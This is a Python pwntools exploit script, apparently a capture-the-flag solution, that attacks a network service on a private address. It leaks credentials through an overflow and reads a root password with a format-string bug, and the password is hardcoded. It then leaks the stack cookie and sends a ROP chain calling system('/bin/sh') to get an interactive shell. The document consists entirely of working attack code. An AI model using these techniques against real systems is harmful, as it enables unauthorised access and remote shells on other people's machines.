#!/usr/bin/env python
from pwn import *

hostname = '172.31.2.58'
port = 48879

p = remote(hostname, port)
p.recvuntil(':')
p.sendline('GUEST')
p.recvuntil(':')
p.sendline('GUEST')
p.recvuntil('&-->')
p.sendline('5')
p.sendline('AAAAAAAAAAAAAAAAA')
p.recvuntil('&-->')
p.sendline('4')
data = p.readline().rstrip()
uname, c1, c2, c3, pw = data.split()
print uname
print pw
p.sendline('AAAAAAAAAAAAAAAA')
data = p.readline().rstrip()
raw = data.split()
new_data = raw[8]
next_uname = new_data[16:16*2]
next_pw = new_data[16*2:16*3]
p.close()
p = remote(hostname, port)
p.recvuntil(':')
p.sendline(next_uname)
p.recvuntil(':')
p.sendline(next_pw)
p.recvuntil('&-->')
p.sendline('2')
p.sendline(p32(0x80cadc4 + 0x10*2*3+0x10) + '.%08x'* 4 + '.%s')
data = p.readline().rstrip()
root_password = data.split('.')[5]
print data.split('.')
p.close()
print root_password
root_password = '981HOD198SKLA'
p = remote(hostname, port)
p.recvuntil(':')
p.sendline('ROOT')
p.recvuntil(':')
p.sendline(root_password)

# leak the stack cookie
p.sendline('2')
p.recvuntil('Enter post number to read:')
p.sendline('.%25$08x')
data = p.recvline().rstrip()
cookie = int(data.split('.')[1],0x10)
print 'got stack cookie == 0x%x' % cookie 

# set up /bin/sh
p.recvuntil('&-->')
p.sendline('3')
p.sendline('/bin/sh')
p.recvuntil('&-->')



# trigger
gadget = 0x000101a0 #: pop {r3, pc}
addr = 0x80cc660 # this is the last entry
system = 0x804050c
rop = '@'*0x20 + p32(cookie) + 'JUNK' + p32(gadget) + p32(addr) + p32(system)
p.sendline('6')
p.recvuntil('Change banner')
p.sendline(rop)
p.interactive()
